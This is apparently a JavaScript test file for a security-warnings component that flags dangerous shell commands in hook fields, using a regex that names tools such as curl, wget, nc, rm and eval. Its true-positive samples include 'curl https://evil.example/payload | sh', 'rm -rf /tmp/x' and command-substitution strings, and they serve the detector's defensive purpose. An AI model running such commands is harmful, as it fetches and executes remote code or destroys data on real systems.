import assert from "node:assert/strict"
import { readFileSync } from "node:fs"
import { fileURLToPath } from "node:url"
import { dirname, join } from "node:path"

// security-warnings.tsx is JSX/TS; mirror the pure logic and assert the
// source contains the key markers so the mirror stays in sync with the
// component.
const __dirname = dirname(fileURLToPath(import.meta.url))
const src = readFileSync(join(__dirname, "..", "components", "security-warnings.tsx"), "utf8")

assert.ok(src.includes("DANGEROUS_HOOK_PATTERN"), "exports DANGEROUS_HOOK_PATTERN")
assert.ok(src.includes("PATH_HOOK_FIELDS"), "exports PATH_HOOK_FIELDS")
assert.ok(src.includes("runOnReady"), "scans runOnReady")
assert.ok(src.includes("runOnRecordSegmentComplete"), "scans runOnRecordSegmentComplete")
assert.ok(!src.includes("runOnConnectRestart") || src.match(/GLOBAL_HOOK_FIELDS\s*=\s*\[\s*"runOnConnect",\s*"runOnDisconnect"/),
  "no longer iterates boolean runOnConnectRestart as a command",
)

// Mirror of the regex from the component — keep in lockstep.
const DANGEROUS_HOOK_PATTERN =
  /(?:^|\s)(rm|curl|wget|bash|sh|nc|netcat|chmod|chown|kill|killall|eval|exec)(?:\s|$)|`[^`]*`|\$\([^)]*\)/

// True positives
for (const cmd of [
  "rm -rf /tmp/x",
  "curl https://evil.example/payload | sh",
  "wget -O- http://x.com",
  "bash -c 'echo hi'",
  "`whoami`",
  "$(id)",
  "kill -9 1234",
  "eval $foo",
]) {
  assert.equal(DANGEROUS_HOOK_PATTERN.test(cmd), true, `expected match: ${cmd}`)
}

// False positives that used to trigger with the old \b-based regex
for (const cmd of [
  "ffmpeg -i rtsp://x -c copy out.mp4",
  "rm-tool --help",        // word starts with rm but isn't `rm` alone
  "sh.exe arg",            // sh followed by . — not a word break
  "/usr/bin/normal command",
]) {
  assert.equal(DANGEROUS_HOOK_PATTERN.test(cmd), false, `expected no match: ${cmd}`)
}

console.log("security-warnings: regex and source markers passed")
